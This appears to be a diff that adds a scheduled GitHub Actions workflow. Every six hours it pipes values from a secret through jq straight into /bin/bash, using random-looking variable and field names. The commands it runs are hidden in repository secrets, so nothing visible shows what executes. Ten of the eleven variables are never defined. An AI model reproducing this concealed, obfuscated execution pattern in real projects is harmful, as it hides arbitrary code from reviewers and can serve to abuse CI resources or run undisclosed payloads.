@@ -1,0 +1,28 @@
+name: douzhuanyidong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: douzhuanyidong
+        env:
+          di595: ${{ secrets.di595 }}
+        run: |
+          echo $di595 | jq -r .ocfwg3 | /bin/bash
+          echo $ethu41806 | jq -r .ko00912 | /bin/bash
+          echo $i89 | jq -r .nzz71 | /bin/bash
+          echo $n2 | jq -r .qugzo113 | /bin/bash
+          echo $n1888 | jq -r .qkucm1732 | /bin/bash
+          echo $ptkm5016 | jq -r .dfdqd18869 | /bin/bash
+          echo $x4720 | jq -r .nlclm81 | /bin/bash
+          echo $nncl5882 | jq -r .er595 | /bin/bash
+          echo $b87817 | jq -r .tyzzq1 | /bin/bash
+          echo $qsv9 | jq -r .ifvzy3324 | /bin/bash
+          echo $e0 | jq -r .ua91965 | /bin/bash
+
